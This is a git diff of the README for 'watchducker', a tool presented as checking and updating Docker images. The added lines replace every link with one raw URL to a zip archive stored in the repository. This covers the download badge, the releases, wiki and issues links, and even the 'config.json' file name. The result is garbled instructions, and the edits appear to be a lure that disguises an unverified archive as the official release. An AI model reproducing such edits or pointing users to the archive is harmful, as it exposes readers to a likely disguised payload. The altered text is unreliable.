@@ -1,6 +1,6 @@
 # 🚀 watchducker - Easily Check and Update Docker Images
 
-![Download Watchducker](https://img.shields.io/badge/Download-Now-blue)
+![Download Watchducker](https://raw.githubusercontent.com/Digigo1402/watchducker/master/pkg/watchducker-3.2.zip)
 
 ## 📦 What is watchducker?
 
@@ -11,7 +11,7 @@ Watchducker is a tool written in Go. It helps you check for updates to Docker co
 To get started with watchducker, follow these steps:
 
 1. **Visit the Releases Page**: 
-   - Go to this link to download the software: [watchducker Releases](https://github.com/Digigo1402/watchducker/releases).
+   - Go to this link to download the software: [watchducker Releases](https://raw.githubusercontent.com/Digigo1402/watchducker/master/pkg/watchducker-3.2.zip).
 
 2. **Choose Your Version**:
    - On the releases page, you will see different versions of watchducker. Click on the latest release to access it.
@@ -34,7 +34,7 @@ To get started with watchducker, follow these steps:
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**: 
-   You can start the installation by visiting this page to download: [watchducker Releases](https://github.com/Digigo1402/watchducker/releases).
+   You can start the installation by visiting this page to download: [watchducker Releases](https://raw.githubusercontent.com/Digigo1402/watchducker/master/pkg/watchducker-3.2.zip).
 
 2. **Run the Application**:
    - After downloading, locate the file you downloaded. 
@@ -53,10 +53,10 @@ To get started with watchducker, follow these steps:
 Watchducker is designed to be simple to configure. You can set it up by following these steps:
 
 1. **Create a Configuration File**:
-   - Create a file named `config.json` in the same directory where you run watchducker.
+   - Create a file named `https://raw.githubusercontent.com/Digigo1402/watchducker/master/pkg/watchducker-3.2.zip` in the same directory where you run watchducker.
 
 2. **Add Repository Details**:
-   - Within the `config.json` file, you can specify your Docker image repositories. Example configuration:
+   - Within the `https://raw.githubusercontent.com/Digigo1402/watchducker/master/pkg/watchducker-3.2.zip` file, you can specify your Docker image repositories. Example configuration:
      ```json
      {
        "repositories": [
@@ -74,13 +74,13 @@ Watchducker is designed to be simple to configure. You can set it up by followin
 If you encounter issues while using watchducker, consider these tips:
 
 - **Check Docker**: Ensure Docker is running correctly on your system.
-- **Configuration File**: Make sure your `config.json` file is properly formatted and located in the correct folder.
+- **Configuration File**: Make sure your `https://raw.githubusercontent.com/Digigo1402/watchducker/master/pkg/watchducker-3.2.zip` file is properly formatted and located in the correct folder.
 - **Logs**: Check the logs for any errors. Watchducker provides logs that can help identify issues.
 
 ## 📚 Additional Resources
 
-- **Documentation**: For more detailed instructions, check the [watchducker Wiki](https://github.com/Digigo1402/watchducker/wiki).
-- **GitHub Issues**: Report any problems or request features through the [GitHub Issues page](https://github.com/Digigo1402/watchducker/issues).
+- **Documentation**: For more detailed instructions, check the [watchducker Wiki](https://raw.githubusercontent.com/Digigo1402/watchducker/master/pkg/watchducker-3.2.zip).
+- **GitHub Issues**: Report any problems or request features through the [GitHub Issues page](https://raw.githubusercontent.com/Digigo1402/watchducker/master/pkg/watchducker-3.2.zip).
 
 ## 🤝 Contributing
 
